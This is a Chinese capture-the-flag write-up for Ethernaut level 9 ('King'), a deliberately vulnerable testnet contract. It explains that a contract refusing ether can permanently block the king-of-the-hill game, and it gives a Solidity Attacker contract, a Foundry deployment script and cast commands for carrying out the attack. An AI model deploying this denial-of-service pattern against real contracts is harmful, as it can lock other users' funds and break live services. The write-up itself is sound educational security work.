# Level 9


[The Ethernaut level 9](https://ethernaut.openzeppelin.com/level/9)

这一关的要求是结束这个庞氏游戏。

仔细阅读这个合约，发现，只要发送 ether 数量比当前 `prize` 值大，就可以成为新的 `king`。同时， `owner` 有权限直接让游戏从零开始。

注意到 `receive` 函数中使用了 `transfer`，而且没有判断改方法执行是否成功。因此，可以从这里下手。只要 `tansfer` 失败了，函数回退，任何人都无法再继续这个游戏。

令 `reansfer` 失败最简单的方式就是写一个不接收 ether 的函数（没有 `fallback` 或 `receive` ），让这和合约成为新的 `king` 就行了。

步骤如下：
1. 部署一个不接收 ether 的合约
2. 令这个合约成为新的 `king`

实例代码如下：

```
contract Attacker {
    address targetAddr;
    bool locked;
    constructor(address targetAddr_) {
        targetAddr = targetAddr_;
    }

    function attack(uint value) public payable {
        (bool success, ) = targetAddr.call{value: value}("");

        require(success, "claim kingship failed");
    }

    receive() external payable {
        require(!locked, "Never send a wei");
        locked = true;
    }
}
```

还需要一个脚本去部署 `Attacker` 合约并发送大于当前 `prize` 的 ether 数量成为 `king`

```
address levelAddr = 0xDB22a38C8d51dc8CF7bfBbffAb8f618cFE148a04;

Attacker attacker = new Attacker(levelAddr);

King target = King(payable(levelAddr));

// 计算需要给攻击合约至少发送多少 ether
uint minValue = target.prize() + 1;
(bool success, ) = address(attacker).call{value: minValue}("");
require(success, "Failed to send Ether to the attacker contract");

// 攻击合约发动攻击
attacker.attack(minValue);
```

完整代码见：[这里](../../ethernaut/script/level09.s.sol)

Foundry 脚本：

调用脚本部署并发动攻击：
```
forge script script/level09.s.sol:CallContractScript --rpc-url sepolia --broadcast
```

查询当前 king
```
cast call <level address> \
"_king()(address)" \
--rpc-url sepolia
```

查询当前 prize
```
cast call <level address> \
"prize()(uint256)" \
--rpc-url sepolia
```

尝试获取king
```
cast send <level address> \
--value <value greate than prize> \
--rpc-url sepolia \
--private-key <your private key>
```

链上记录：
- [level(`King`) 实例](https://sepolia.etherscan.io/address/0xDB22a38C8d51dc8CF7bfBbffAb8f618cFE148a04)
- [attack](https://sepolia.etherscan.io/tx/0xbead529e69d0027837c5329fc591b96b5b08cb317d64995e25cc7a82822642ae)
